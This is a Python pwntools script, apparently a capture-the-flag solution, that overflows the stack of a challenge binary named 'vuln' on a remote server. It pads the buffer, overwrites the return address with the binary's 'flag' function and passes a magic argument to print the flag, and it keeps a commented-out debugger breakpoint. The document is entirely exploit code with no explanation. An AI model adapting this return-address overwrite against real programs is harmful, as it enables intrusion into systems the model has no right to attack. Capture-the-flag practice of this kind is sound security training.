```python
from pwn import *


p = process('./vuln')
exe = ELF('./vuln')
p = remote('159.65.20.166', 32616)

# gdb.attach(p, gdbscript = '''
# b*0x080492b0
# c
# ''') 

# input()

p.sendline(p32(0xdeadbeef)*0x2f + p32(exe.sym.flag) + p32(0xdeadbeef)*2 +p32(0xc0ded00d))
p.recvuntil(b'\n')

flag = p.recvuntil(b'}')
print(flag)

p.interactive()
```

![image](https://github.com/gookoosss/CTF/assets/128712571/4a5db994-e6ac-4836-bedb-415d54cb0619)
